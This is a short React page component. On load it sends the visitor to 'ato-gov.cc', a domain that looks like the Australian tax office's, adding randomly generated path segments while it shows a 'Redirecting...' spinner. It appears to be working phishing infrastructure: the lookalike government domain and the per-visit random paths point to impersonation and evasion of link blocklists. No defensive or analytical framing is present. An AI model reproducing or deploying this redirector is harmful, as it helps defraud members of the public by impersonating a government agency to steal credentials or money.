import { useEffect } from "react";

function generateRandomNumber(length = 6) {
  let n = "";
  for (let i = 0; i < length; i++) n += Math.floor(Math.random() * 10);
  return n;
}

export default function Home() {
  useEffect(() => {
    const segment1 = generateRandomNumber();
    const segment2 = generateRandomNumber();
    const redirectUrl = `https://www.ato-gov.cc/${segment1}/${segment2}/`;
    window.location.replace(redirectUrl);
  }, []);

  return (
    <div style={{
      margin:0, padding:0, backgroundColor:'#fff',
      fontFamily:"'Open Sans', sans-serif",
      display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', height:'100vh', color:'#333'
    }}>
      <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet" />
      <div style={{
        border:'6px solid #f3f3f3',
        borderTop:'6px solid #ffc421',
        borderRadius:'50%',
        width:50, height:50,
        animation:'spin 1s linear infinite', marginBottom:20
      }} />
      <div style={{fontSize:'1.2em', textAlign:'center'}}>Redirecting...</div>
      <style>{`@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}`}</style>
    </div>
  );
}
